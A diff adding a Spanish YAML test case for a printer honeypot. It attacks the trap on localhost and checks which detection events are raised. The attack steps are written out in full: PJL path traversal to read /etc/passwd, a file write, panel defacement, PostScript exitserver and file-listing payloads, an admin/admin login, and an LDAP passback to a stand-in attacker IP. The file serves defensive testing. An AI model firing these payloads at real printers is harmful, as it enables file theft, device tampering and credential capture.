@@ -1,0 +1,185 @@
+# Prueba automática del módulo: herramientas/probar-trampa.sh impresora
+# Se despliega con los tres servicios encendidos y se ataca con lo que haría un
+# atacante real: reconocimiento y robo de ficheros por PJL (estilo PRET) en el
+# 9100, ipptool en el 631 y la web de administración en el 80, incluido el
+# passback de credenciales (apuntar el servidor LDAP al del atacante). Las IP
+# son de documentación (RFC 5737) y nada de lo enviado tiene efecto: la trampa
+# no imprime ni ejecuta nada.
+parametros:
+  puertoRaw: 39100
+  ipp: 'yes'
+  puertoIpp: 39631
+  web: 'yes'
+  puertoWeb: 39080
+  modelo: 'auto'
+  nombreEquipo: PRN-PRUEBA-01
+  ubicacion: 'Planta 2 - Administración'
+arranque: 3
+ataques:
+  # Espera a que el 9100 conteste a @PJL INFO ID (con la máquina cargada tarda
+  # en arrancar), como el bucle de cowrie.
+  - imagen: atacante
+    orden:
+      - sh
+      - -c
+      - |
+        for i in $(seq 1 30); do
+          printf '\033%%-12345X@PJL INFO ID\r\n\033%%-12345X\r\n' | nc -N -w 5 127.0.0.1 ${puertoRaw} | grep -q 'INFO ID' && exit 0
+          sleep 1
+        done
+        exit 1
+  # Secuencia PJL de un atacante: reconocimiento (INFO), listado y lectura de
+  # ficheros con recorrido de rutas (PRET), escritura de un fichero, un trabajo
+  # de impresión crudo y desfiguración del panel.
+  - imagen: atacante
+    orden:
+      - sh
+      - -c
+      - |
+        printf '\033%%-12345X@PJL INFO ID\r\n@PJL INFO STATUS\r\n@PJL INFO CONFIG\r\n@PJL INFO FILESYS\r\n@PJL FSDIRLIST NAME="0:\\" ENTRY=1 COUNT=20\r\n@PJL FSUPLOAD FORMAT:BINARY NAME="0:\\..\\..\\..\\..\\etc\\passwd" OFFSET=0 SIZE=128\r\n@PJL FSDOWNLOAD FORMAT:BINARY SIZE=12 NAME="0:\\exploit.ps"\r\n%%!PS marcador\r\n@PJL RDYMSG DISPLAY="HACKEADA POR PRUEBA"\r\n\033%%-12345X\r\n' | nc -N -w 5 127.0.0.1 ${puertoRaw}
+  # PostScript peligroso por el 9100 (estilo PRET en modo ps): robo de ficheros
+  # con recorrido de rutas y control del servidor. La trampa no ejecuta nada,
+  # pero lo detecta y lo marca como crítico (impresora.ps.peligroso).
+  - imagen: atacante
+    orden:
+      - sh
+      - -c
+      - |
+        printf '\033%%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT\r\nserverdict begin 0 exitserver\r\n(0:/../../etc/passwd) (r) file\r\n/str 256 string def (*) {==} str filenameforall\r\n\033%%-12345X\r\n' | nc -N -w 5 127.0.0.1 ${puertoRaw}
+  # IPP: Get-Printer-Attributes (lo que hace ipptool y cualquier driver) y un
+  # trabajo de impresión. La respuesta tiene que ser válida para ipptool.
+  - imagen: atacante
+    orden:
+      - sh
+      - -c
+      - |
+        cat > /tmp/gpa.test <<'FIN'
+        {
+          OPERATION Get-Printer-Attributes
+          GROUP operation-attributes-tag
+          ATTR charset attributes-charset utf-8
+          ATTR naturalLanguage attributes-natural-language en
+          ATTR uri printer-uri $uri
+          ATTR keyword requested-attributes all
+          STATUS successful-ok
+          EXPECT printer-make-and-model
+          EXPECT printer-name
+          EXPECT printer-state
+          EXPECT operations-supported
+          EXPECT printer-uri-supported
+        }
+        FIN
+        cat > /tmp/pj.test <<'FIN'
+        {
+          OPERATION Print-Job
+          GROUP operation-attributes-tag
+          ATTR charset attributes-charset utf-8
+          ATTR naturalLanguage attributes-natural-language en
+          ATTR uri printer-uri $uri
+          ATTR name requesting-user-name atacante
+          ATTR mimeMediaType document-format text/plain
+          GROUP job-attributes-tag
+          ATTR integer copies 1
+          FILE /tmp/doc.txt
+          STATUS successful-ok
+        }
+        FIN
+        echo 'documento de prueba' > /tmp/doc.txt
+        ipptool -tv ipp://127.0.0.1:${puertoIpp}/ipp/print /tmp/gpa.test || exit 1
+        ipptool -tv ipp://127.0.0.1:${puertoIpp}/ipp/print /tmp/pj.test || exit 1
+  # Web de administración: navegación, intento de inicio de sesión y passback
+  # (apuntar el servidor LDAP al del atacante).
+  - imagen: atacante
+    orden:
+      - sh
+      - -c
+      - |
+        curl -s -m 8 http://127.0.0.1:${puertoWeb}/ > /dev/null || exit 1
+        curl -s -m 8 --data 'username=admin&password=admin' http://127.0.0.1:${puertoWeb}/login > /dev/null || exit 1
+        curl -s -m 8 --data 'ldap_server=203.0.113.66&ldap_base=dc=corp,dc=local' http://127.0.0.1:${puertoWeb}/config > /dev/null || exit 1
+        curl -s -m 8 --data 'device_name=PRN-RECEPCION' http://127.0.0.1:${puertoWeb}/config > /dev/null || exit 1
+espera:
+  # Sesión TCP completa: el origen no está falseado.
+  - {
+      accion: conexion,
+      conexion: true,
+      severidad: baja,
+      detalle: { eventid: impresora.session.connect }
+    }
+  # Reconocimiento PJL.
+  - {
+      accion: comando,
+      severidad: media,
+      detalle: { eventid: impresora.pjl.info, comando: INFO ID }
+    }
+  # Listado de ficheros de la impresora (sin recorrido).
+  - {
+      accion: lectura,
+      severidad: media,
+      detalle: { eventid: impresora.pjl.fs, comando: FSDIRLIST }
+    }
+  # Robo de ficheros con recorrido de rutas (PRET): crítico.
+  - {
+      accion: lectura,
+      severidad: critica,
+      detalle:
+        { eventid: impresora.pjl.traversal, comando: FSUPLOAD, grave: recorrido, ruta: passwd }
+    }
+  # Escritura/borrado en los ficheros de la impresora.
+  - {
+      accion: escritura,
+      severidad: alta,
+      detalle: { eventid: impresora.pjl.escritura, comando: FSDOWNLOAD }
+    }
+  # Desfiguración del panel.
+  - {
+      accion: comando,
+      severidad: alta,
+      detalle: { eventid: impresora.pjl.control, comando: RDYMSG, texto: HACKEADA }
+    }
+  # Trabajo de impresión crudo: solo huella y tamaño.
+  - {
+      accion: escritura,
+      severidad: media,
+      detalle: { eventid: impresora.pjl.job, huella: 'sha256:' }
+    }
+  # PostScript peligroso por el 9100 (robo de ficheros/control): crítico.
+  - {
+      accion: comando,
+      severidad: critica,
+      detalle: { eventid: impresora.ps.peligroso, comando: POSTSCRIPT }
+    }
+  # Petición IPP creíble para ipptool.
+  - {
+      accion: comando,
+      severidad: baja,
+      detalle: { eventid: impresora.ipp.peticion, operacion: Get-Printer-Attributes }
+    }
+  # Trabajo IPP: usuario y huella, sin el contenido.
+  - {
+      accion: escritura,
+      severidad: media,
+      detalle: { eventid: impresora.ipp.trabajo, operacion: Print-Job, huella: 'sha256:' }
+    }
+  # Navegación por la web.
+  - { accion: comando, severidad: baja, detalle: { eventid: impresora.web.get, metodo: GET } }
+  # Intento de inicio de sesión: usuario y contraseña completos.
+  - {
+      accion: autenticacion,
+      severidad: alta,
+      usuario: admin,
+      detalle: { eventid: impresora.web.login, password: admin }
+    }
+  # Passback de credenciales: el servidor del atacante queda apuntado.
+  - {
+      accion: escritura,
+      severidad: critica,
+      detalle: { eventid: impresora.web.passback, servidor: 203.0.113.66, grave: servidor }
+    }
+  # Cambio de configuración que no es un servidor (nombre del equipo): alto.
+  - {
+      accion: escritura,
+      severidad: alta,
+      detalle: { eventid: impresora.web.config, campo: device_name }
+    }
+tiempo: 25
